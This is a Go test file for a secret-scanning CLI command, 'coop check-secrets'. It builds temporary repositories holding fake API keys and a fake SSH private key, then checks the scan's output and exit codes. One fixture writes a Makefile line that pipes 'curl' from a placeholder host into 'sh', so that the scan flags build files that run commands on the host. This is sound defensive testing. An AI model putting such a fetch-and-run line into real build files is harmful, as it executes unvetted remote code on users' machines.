package cli

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/AndrewDryga/coop/internal/box"
	"github.com/AndrewDryga/coop/internal/config"
	"github.com/AndrewDryga/coop/internal/secretscan"
	"github.com/AndrewDryga/coop/internal/testutil/gitrepo"
)

// The approved `coop check-secrets` transcripts. Every one of these drives the REAL command over
// a real temporary project, so the fixture proves the scan's scope sentence, its counting, its
// copyable exception block and — the point of the whole exercise — that a scan which could not
// read a file never reports a clean result.

// scanRepo builds a project for one fixture. Files are repo-relative; a path under a directory
// that does not exist yet is created.
type scanRepo struct {
	git    bool
	files  map[string]string
	chmod  map[string]os.FileMode
	ignore []string // .gitignore lines
}

func (r scanRepo) build(t *testing.T) string {
	t.Helper()
	// gitrepo.New closes both git config doors; a scan reads `git ls-files --exclude-standard`,
	// so a developer's core.excludesFile would otherwise change which files a fixture sees.
	repo := t.TempDir()
	if r.git {
		repo, _ = gitrepo.New(t)
	}
	if len(r.ignore) > 0 {
		r.files[".gitignore"] = strings.Join(r.ignore, "\n") + "\n"
	}
	for rel, body := range r.files {
		full := filepath.Join(repo, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}

	for rel, mode := range r.chmod {
		if err := os.Chmod(filepath.Join(repo, filepath.FromSlash(rel)), mode); err != nil {
			t.Fatal(err)
		}
		t.Cleanup(func() { _ = os.Chmod(filepath.Join(repo, filepath.FromSlash(rel)), 0o644) })
	}
	return repo
}

// openAIKeyFile puts a token-shaped value on line 12 of a Go file, so the finding's line number
// is a property of the fixture rather than of where the constant happens to sit.
func openAIKeyFile() string {
	return strings.Repeat("// padding\n", 11) +
		"const key = \"sk-proj-N7qFvZm2Ld8RwXcTb3JhKp6Ys9Ug4Aa1\"\n"
}

const testPrivateKey = "-----BEGIN OPENSSH PRIVATE KEY-----\n" +
	"b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\n" +
	"-----END OPENSSH PRIVATE KEY-----\n"

func runCheckSecrets(t *testing.T, repo string, args []string) (string, int) {
	t.Helper()
	a := &app{cfg: &config.Config{RepoOverride: repo, ConfigDir: t.TempDir()}}
	var code int
	out := captureStderr(t, func() { code, _ = a.cmdCheckSecrets(args) })
	return out, code
}

func TestApprovedSecretScans(t *testing.T) {
	pinGitConfig(t)
	cases := []struct {
		fixture string
		args    []string
		code    int
		repo    scanRepo
	}{
		{
			fixture: "19a-scan-clean", code: 0,
			repo: scanRepo{git: true, files: map[string]string{"src/app.go": "package app\n"}},
		},
		{
			fixture: "19b-scan-clean-include-ignored", args: []string{"--include-ignored"}, code: 0,
			repo: scanRepo{git: true, files: map[string]string{"src/app.go": "package app\n"}},
		},
		{
			fixture: "19c-scan-clean-ignored-blind-spot", code: 0,
			repo: scanRepo{
				git:    true,
				ignore: []string{"local-data/"},
				files: map[string]string{
					"src/app.go":           "package app\n",
					"local-data/one.txt":   "one\n",
					"local-data/two.txt":   "two\n",
					"local-data/three.txt": "three\n",
				},
			},
		},
		{
			fixture: "19d-two-findings", code: 1,
			repo: scanRepo{git: true, files: map[string]string{
				"config/client.go":  openAIKeyFile(),
				"deploy/id_ed25519": testPrivateKey,
			}},
		},
		{
			fixture: "19e-finding-and-ignored-blind-spot", code: 1,
			repo: scanRepo{
				git:    true,
				ignore: []string{"local-data/"},
				files: map[string]string{
					"config/client.go":     openAIKeyFile(),
					"local-data/one.txt":   "one\n",
					"local-data/two.txt":   "two\n",
					"local-data/three.txt": "three\n",
				},
			},
		},
		{
			fixture: "19g-no-files", code: 0,
			repo: scanRepo{git: true, files: map[string]string{}},
		},
		{
			fixture: "19h-unreadable-file", code: 1,
			repo: scanRepo{
				git:   true,
				files: map[string]string{"config/credentials.txt": "nothing\n"},
				chmod: map[string]os.FileMode{"config/credentials.txt": 0o000},
			},
		},
		{
			fixture: "19i-finding-and-read-failure", code: 1,
			repo: scanRepo{
				git: true,
				files: map[string]string{
					"config/client.go":       openAIKeyFile(),
					"config/credentials.txt": "nothing\n",
				},
				chmod: map[string]os.FileMode{"config/credentials.txt": 0o000},
			},
		},
		{
			fixture: "19k-directory-scan-fallback", code: 0,
			repo: scanRepo{files: map[string]string{"src/app.go": "package app\n"}},
		},
		{
			fixture: "19l-coopignore-hidden-candidate", code: 1,
			repo: scanRepo{git: true, files: map[string]string{
				".coopignore":             "config/credentials.yaml\n",
				"config/credentials.yaml": "token: sk-proj-N7qFvZm2Ld8RwXcTb3JhKp6Ys9Ug4Aa1\n",
				"src/app.go":              "package app\n",
			}},
		},
	}
	for _, tc := range cases {
		t.Run(tc.fixture, func(t *testing.T) {
			if len(tc.repo.chmod) > 0 && os.Geteuid() == 0 {
				t.Skip("root ignores file permissions")
			}
			out, code := runCheckSecrets(t, tc.repo.build(t), tc.args)
			if code != tc.code {
				t.Errorf("exit = %d, want %d", code, tc.code)
			}
			assertApprovedOutput(t, tc.fixture, out)
		})
	}
}

// A clean scan still names the changed files that run commands on the reader's own machine. It is
// informational: the exit code belongs to the secret scan.
func TestApprovedSecretScanHostSurfaces(t *testing.T) {
	pinGitConfig(t)
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo, git := gitrepo.New(t)
	write := func(rel, body string) {
		t.Helper()
		full := filepath.Join(repo, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("Makefile", "all:\n\ttrue\n")
	git("add", "Makefile")
	git("commit", "-qm", "base")
	write("Makefile", "all:\n\tcurl -s https://example.invalid | sh\n")
	write(".githooks/pre-commit", "#!/bin/sh\n")
	out, code := runCheckSecrets(t, repo, nil)
	if code != 0 {
		t.Errorf("a host-surface report must not change the exit code, got %d", code)
	}
	assertApprovedOutput(t, "19f-clean-with-host-surfaces", out)
}

// The round trip the help page promises: a scan prints a copyable entry, the entry goes into
// .coopsecretsignore with a reason, and the rescan reports the finding as reviewed.
func TestApprovedSecretExceptionRoundTrip(t *testing.T) {
	pinGitConfig(t)
	repo := scanRepo{git: true, files: map[string]string{"config/client.go": openAIKeyFile()}}.build(t)
	out, code := runCheckSecrets(t, repo, nil)
	if code != 1 {
		t.Fatalf("a finding must fail the scan, got %d", code)
	}
	id := fingerprintIn(t, out)
	write := func(body string) {
		t.Helper()
		if err := os.WriteFile(filepath.Join(repo, secretscan.ExceptionsFile), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("# config/client.go — OpenAI API key\n" + id + " # Public test fixture\n")
	out, code = runCheckSecrets(t, repo, nil)
	if code != 0 {
		t.Fatalf("a reviewed finding must not fail the scan: %d\n%s", code, out)
	}
	want := "✓ No new possible secrets found\n  1 finding ignored by .coopsecretsignore.\n"
	if out != want {
		t.Errorf("rescan = %q, want %q", out, want)
	}
	// The file is read, not trusted: a malformed entry stops the check instead of being skipped.
	write("# config/client.go — OpenAI API key\n" + id + " # Public test fixture\n\n\nnot-a-fingerprint\n")
	out, code = runCheckSecrets(t, repo, nil)
	if code != 1 {
		t.Fatalf("a malformed exception file must fail the scan, got %d", code)
	}
	wantBlock := "✗ Could not read .coopsecretsignore\n\n" +
		"      Line 5 needs a finding ID followed by # and your reason.\n\n" +
		"  Fix the entry, then run coop check-secrets again.\n"
	if out != wantBlock {
		t.Errorf("malformed exception file = %q, want %q", out, wantBlock)
	}
}

// fingerprintIn pulls the copyable id out of a scan's output — the exact string a person pastes.
func fingerprintIn(t *testing.T, out string) string {
	t.Helper()
	for _, line := range strings.Split(out, "\n") {
		if field := strings.TrimSpace(line); strings.HasPrefix(field, secretscan.FingerprintVersion+":") {
			id, _, _ := strings.Cut(field, " ")
			return id
		}
	}
	t.Fatalf("no copyable fingerprint in the scan output:\n%s", out)
	return ""
}

// An exception is scoped to THIS check. The shared detector every other consumer uses — fork
// merge's policy scan, a checkpoint upload, session redaction — keeps reporting the finding, and
// a note inside the repository is never permission to move a credential out of it.
func TestSecretExceptionsDoNotReachSharedScanners(t *testing.T) {
	pinGitConfig(t)
	repo := scanRepo{git: true, files: map[string]string{"config/client.go": openAIKeyFile()}}.build(t)
	out, _ := runCheckSecrets(t, repo, nil)
	id := fingerprintIn(t, out)
	if err := os.WriteFile(filepath.Join(repo, secretscan.ExceptionsFile),
		[]byte(id+" # Public test fixture\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, code := runCheckSecrets(t, repo, nil); code != 0 {
		t.Fatalf("the reviewed finding still failed check-secrets (%d)", code)
	}
	content, err := os.ReadFile(filepath.Join(repo, "config", "client.go"))
	if err != nil {
		t.Fatal(err)
	}
	if shared := box.ScanSecrets(string(content)); len(shared) != 1 {
		t.Errorf("the shared detector returned %d findings; an exception must not reach it", len(shared))
	}
}

// A scan that could not read a file has not finished, even when every finding it DID reach was
// already reviewed. Reporting the ignored count is fine; reporting a clean result is not.
func TestIncompleteScanFailsEvenWhenEverythingReadableWasIgnored(t *testing.T) {
	pinGitConfig(t)
	if os.Geteuid() == 0 {
		t.Skip("root ignores file permissions")
	}
	repo := scanRepo{git: true, files: map[string]string{"config/client.go": openAIKeyFile()}}.build(t)
	out, _ := runCheckSecrets(t, repo, nil)
	id := fingerprintIn(t, out)
	if err := os.WriteFile(filepath.Join(repo, secretscan.ExceptionsFile),
		[]byte(id+" # Public test fixture\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	locked := filepath.Join(repo, "config", "credentials.txt")
	if err := os.WriteFile(locked, []byte("nothing\n"), 0o000); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(locked, 0o644) })
	out, code := runCheckSecrets(t, repo, nil)
	if code != 1 {
		t.Errorf("an unreadable file did not fail the scan (%d):\n%s", code, out)
	}
	want := "✗ Could not finish checking for secrets\n\n" +
		"      config/credentials.txt could not be read: permission denied.\n\n" +
		"  Fix the file permissions, then run coop check-secrets again.\n" +
		"  No possible secrets were found in the files that could be checked.\n\n" +
		"1 finding ignored by .coopsecretsignore.\n"
	if out != want {
		t.Errorf("incomplete scan = %q,\nwant %q", out, want)
	}
	if strings.Contains(out, "No new possible secrets found") {
		t.Error("a scan with a hole in it reported a clean result")
	}
}
